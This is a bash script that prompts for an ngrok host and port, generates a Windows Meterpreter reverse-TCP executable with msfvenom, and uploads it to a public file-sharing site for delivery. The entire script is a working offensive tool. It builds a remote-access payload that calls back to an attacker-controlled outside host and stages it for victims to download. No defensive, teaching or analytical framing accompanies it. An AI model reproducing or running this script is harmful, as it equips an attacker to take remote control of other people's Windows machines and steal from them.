#!/bin/bash

# Prompt user for URL and port
read -p "Enter the URL (e.g., 0.tcp.in.ngrok.io): " URL  
read -p "Enter the Port (e.g., 18054): " PORT  

# Validate inputs
if [[ -z "$URL" || -z "$PORT" ]]; then
    echo "Error: URL and Port must not be empty."
    exit 1
fi

# Generate Meterpreter payload
echo "[*] Generating Meterpreter payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$URL LPORT=$PORT -f exe -o meterpreter.exe

# Verify the payload was created
if [[ -f "meterpreter.exe" ]]; then
    echo "[*] Payload meterpreter.exe created successfully."
else
    echo "Error: Failed to create payload."
    exit 1
fi

# Start HTTP server
echo "[*] Uploading File To The Server..."
curl -F "file=@meterpreter.exe" https://file.io